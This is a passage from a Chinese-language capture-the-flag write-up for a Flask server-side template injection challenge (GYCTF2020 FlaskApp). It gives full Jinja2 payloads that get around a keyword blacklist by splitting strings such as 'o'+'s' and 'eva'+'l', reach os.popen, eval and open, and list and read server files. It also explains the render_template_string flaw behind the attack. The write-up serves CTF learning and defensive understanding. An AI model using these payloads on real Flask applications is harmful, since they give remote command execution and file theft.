-<div class="language-text highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>{{url_for.__globals__['o'+'s']['p'+'open']('cat /this_is_the_fl'+'ag.txt').read()}}
-</span></code></pre></div>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>CTF2{dba20aea-1830-4ecc-b055-b73a1d9ba4fa}
-</span></code></pre></div>
-<h4 id="step-7"><a class="toclink" href="gyctf2020-flaskapp-ssti/#step-7">Step 7：换一条路（长链）</a></h4>
-<p>短路能通，是因为 Flask 注入了 <code>url_for</code>。<strong>换个环境把 <code>url_for</code> 删了，这条路就断。</strong>所以再走一遍长链——从字面量 <code>''</code> 开始爬。</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>{{''.__class__.__base__.__subclasses__()|selectattr('__name__','equalto','catch_warnings')|first}}
-</span><span id="__span-9-2"><a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a>→  &lt;class '_py_warnings.catch_warnings'&gt;
-</span></code></pre></div>
-<p><strong>（<code>__name__</code> 是四个下划线；<code>name</code> 不出东西。另外 <code>equalto</code> 要加引号，不加会报 <code>no test named Undefined</code>。）</strong></p>
-<p>然后接 <code>['__init__']['__globals__']['__builtins__']</code>，拿到 builtins 的 dict。</p>
-<p><strong>接下来我一开始想用 <code>eval</code>，直接给出去的版本报了 <code>nonono</code>，我不知道是哪个还被过滤了。</strong></p>
-<blockquote>
-<p><strong>答案：是 <code>"os"</code>。</strong></p>
-<p>我把 <code>import</code> 拆了、<code>popen</code> 拆了、<code>eval</code> 拆了，<strong>唯独把 <code>"os"</code> 原样写在了字符串里</strong> —— 那两个字面量照样会被匹配。</p>
-<p>拆开之后：</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>('__imp'+'ort__("o"+"s").pop'+'en("ls /").read()')
-</span></code></pre></div>
-</blockquote>
-<p><strong>完整的一条：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>{{(''.__class__.__base__.__subclasses__()|selectattr('__name__','equalto','catch_warnings')|first)['__init__']['__globals__']['__builtins__']['eva'+'l']('__imp'+'ort__("o"+"s").pop'+'en("cat /this_is_the_fl"+"ag.txt").read()')}}
-</span></code></pre></div>
-<p><strong>也是先 <code>ls /</code> 再 <code>cat</code>，一样拿不到名字就没法读。</strong></p>
-<hr />
-<h3 id="_3"><a class="toclink" href="gyctf2020-flaskapp-ssti/#_3">解题思路总结</a></h3>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a>加解密功能 → 解密的结果被当模板渲染
-</span><span id="__span-12-2"><a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a>  → {{7*7}} 回 nonono → 有黑名单，但思路对
-</span><span id="__span-12-3"><a id="__codelineno-12-3" name="__codelineno-12-3" href="#__codelineno-12-3"></a>    → {{config}} 确认 Flask
-</span><span id="__span-12-4"><a id="__codelineno-12-4" name="__codelineno-12-4" href="#__codelineno-12-4"></a>      → url_for 能用 → 短路：url_for.__globals__
-</span><span id="__span-12-5"><a id="__codelineno-12-5" name="__codelineno-12-5" href="#__codelineno-12-5"></a>        → 卡在 ['os']（os 被拦）→ 拼成 ['o'+'s']
-</span><span id="__span-12-6"><a id="__codelineno-12-6" name="__codelineno-12-6" href="#__codelineno-12-6"></a>          → ls / 找到 this_is_the_flag.txt
-</span><span id="__span-12-7"><a id="__codelineno-12-7" name="__codelineno-12-7" href="#__codelineno-12-7"></a>            → cat 它（flag 也被拦，路径也拼）→ flag
-</span><span id="__span-12-8"><a id="__codelineno-12-8" name="__codelineno-12-8" href="#__codelineno-12-8"></a>              → 再走一遍长链验证：'' → subclasses → catch_warnings
-</span><span id="__span-12-9"><a id="__codelineno-12-9" name="__codelineno-12-9" href="#__codelineno-12-9"></a>                → __builtins__ → eval（import/os/popen 全要拆）→ flag
-</span></code></pre></div>
-<h4 id="_4"><a class="toclink" href="gyctf2020-flaskapp-ssti/#_4">漏洞原理</a></h4>
-<p><strong>① 解密结果被当成模板源码</strong></p>
-<div class="language-python highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a><span class="n">res</span> <span class="o">=</span> <span class="n">render_template_string</span><span class="p">(</span><span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">text</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span>
-</span></code></pre></div>
-<p><strong>base64 只是把输入换了个形式，并没有让它变成"数据"。解密之后它照样进模板引擎求值。</strong></p>
-<p><strong>② 黑名单是"词"，绕过靠"拼接"</strong></p>
-<p>过滤器查的是<strong>你原文里有没有那串字母</strong>；Jinja 求值时会把 <code>+</code> 算掉，得到完整字符串。</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a>原文：'o'+'s'      → 不含 os
-</span><span id="__span-14-2"><a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a>求值：'os'          → 才是真正的属性名
-</span></code></pre></div>
-<p><strong>过滤看"字面"，执行看"结果"——这两者的差，就是绕过空间。</strong></p>
-<p><strong>③ 长链和短链的区别只在入口</strong></p>
-<p>短链从<strong>框架注入的名字</strong>（<code>url_for</code>）出发，长链从<strong>字面量</strong>（<code>''</code>）出发。终点一样，都是拿到 <code>__builtins__</code>。</p>
-<h4 id="_5"><a class="toclink" href="gyctf2020-flaskapp-ssti/#_5">关键知识点</a></h4>
-<table>
-<thead>
-<tr>
-<th>知识点</th>
-<th>说明</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>黑名单（本题）</td>
-<td><code>*</code> <code>eval</code> <code>os</code> <code>popen</code> <code>system</code> <code>import</code> <code>request</code> <code>subprocess</code> <code>flag</code>，子串匹配</td>
-</tr>
-<tr>
-<td><code>+</code> 拼接</td>
-<td><code>'o'+'s'</code> 绕 <code>os</code>；<code>'this_is_the_fl'+'ag.txt'</code> 绕 <code>flag</code></td>
-</tr>
-<tr>
-<td>子串陷阱</td>
-<td><code>host</code> 里含 <code>os</code> 也会被拦——拆词时每一段都要检查</td>
-</tr>
-<tr>
-<td>POST-Redirect-GET</td>
-<td>结果存 session，302 的响应体里没有结果</td>
-</tr>
-<tr>
-<td>结果越长 cookie 越大</td>
-<td>因为结果被塞进了 session</td>
-</tr>
-<tr>
-<td><code>\|selectattr</code></td>
-<td>按属性名筛，代替"数下标"跨环境稳定</td>
-</tr>
-<tr>
-<td><code>'__name__'</code> vs <code>'name'</code></td>
-<td>前者才有值，后者筛不出东西</td>
-</tr>
-<tr>
-<td><code>'equalto'</code> 要加引号</td>
-<td>不加时报 <code>no test named Undefined</code></td>
-</tr>
-<tr>
-<td>双层拆分</td>
-<td><code>eval</code> 那条：Jinja 层拆一次，Python 源码再拆一次</td>
-</tr>
-<tr>
-<td><code>open</code> vs <code>eval</code></td>
-<td><code>open</code> 只读文件，不碰 shell，名单里也没它——比 <code>eval</code> 省事</td>
-</tr>
-</tbody>
-</table>
-<hr />
-<details class="note">
-<summary>两条链的完整 payload（实测）</summary>
-<p><strong>短路（<code>url_for</code>）</strong></p>
-<div class="language-jinja highlight"><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a><span class="cp">{{</span><span class="nv">url_for.__globals__</span><span class="o">[</span><span class="s1">'o'</span><span class="o">+</span><span class="s1">'s'</span><span class="o">][</span><span class="s1">'p'</span><span class="o">+</span><span class="s1">'open'</span><span class="o">](</span><span class="s1">'ls /'</span><span class="o">)</span><span class="nv">.read</span><span class="o">()</span><span class="cp">}}</span>
-</span><span id="__span-15-2"><a id="__codelineno-15-2" name="__codelineno-15-2" href="#__codelineno-15-2"></a><span class="cp">{{</span><span class="nv">url_for.__globals__</span><span class="o">[</span><span class="s1">'o'</span><span class="o">+</span><span class="s1">'s'</span><span class="o">][</span><span class="s1">'p'</span><span class="o">+</span><span class="s1">'open'</span><span class="o">](</span><span class="s1">'cat /this_is_the_fl'</span><span class="o">+</span><span class="s1">'ag.txt'</span><span class="o">)</span><span class="nv">.read</span><span class="o">()</span><span class="cp">}}</span>
-</span></code></pre></div>
-<p><strong>长链（<code>subclasses</code> + <code>eval</code>，双层拆分）</strong></p>
-<div class="language-jinja highlight"><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a><span class="cp">{{</span><span class="o">(</span><span class="s1">''</span><span class="nv">.__class__.__base__.__subclasses__</span><span class="o">()|</span><span class="nf">selectattr</span><span class="o">(</span><span class="s1">'__name__'</span><span class="o">,</span><span class="s1">'equalto'</span><span class="o">,</span><span class="s1">'catch_warnings'</span><span class="o">)|</span><span class="nf">first</span><span class="o">)[</span><span class="s1">'__init__'</span><span class="o">][</span><span class="s1">'__globals__'</span><span class="o">][</span><span class="s1">'__builtins__'</span><span class="o">][</span><span class="s1">'eva'</span><span class="o">+</span><span class="s1">'l'</span><span class="o">](</span><span class="s1">'__imp'</span><span class="o">+</span><span class="s1">'ort__("o"+"s").pop'</span><span class="o">+</span><span class="s1">'en("ls /").read()'</span><span class="o">)</span><span class="cp">}}</span>
-</span></code></pre></div>
-<p><strong>长链（<code>subclasses</code> + <code>open</code>，只有一层拆分，更省事）</strong></p>
-<div class="language-jinja highlight"><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a><span class="cp">{{</span><span class="o">(</span><span class="s1">''</span><span class="nv">.__class__.__base__.__subclasses__</span><span class="o">()|</span><span class="nf">selectattr</span><span class="o">(</span><span class="s1">'__name__'</span><span class="o">,</span><span class="s1">'equalto'</span><span class="o">,</span><span class="s1">'catch_warnings'</span><span class="o">)|</span><span class="nf">first</span><span class="o">)[</span><span class="s1">'__init__'</span><span class="o">][</span><span class="s1">'__globals__'</span><span class="o">][</span><span class="s1">'__builtins__'</span><span class="o">][</span><span class="s1">'open'</span><span class="o">](</span><span class="s1">'/this_is_the_fl'</span><span class="o">+</span><span class="s1">'ag.txt'</span><span class="o">)</span><span class="nv">.read</span><span class="o">()</span><span class="cp">}}</span>
-</span></code></pre></div>
-<p><strong>注意：<code>open</code> 版必须先知道文件名（靠 <code>ls /</code>），而且不能执行命令，只能读文件。</strong></p>
-</details>
-<hr />
-<details class="note">
-<summary>两道黑名单自查（我踩过的）</summary>
-<p><strong>① 以为 <code>url_for.__globals__</code> 被拦了</strong></p>
-<p>其实是 302 重定向，响应体里本来就没有结果。<strong>先分清"没执行"和"结果在下一页"。</strong></p>
-<p><strong>② <code>eval</code> 那条报 <code>nonono</code>，找不到是哪个词</strong></p>
-<p><strong>逐个测试是最快的办法</strong>：把可疑的词单独包成 <code>{{'xxx'}}</code> 发一遍，看哪个返回 <code>nonono</code>。</p>
-<p>我拆了 <code>import</code>、<code>popen</code>、<code>eval</code>，就是没拆 <code>"os"</code>。</p>
 </details>
     
     
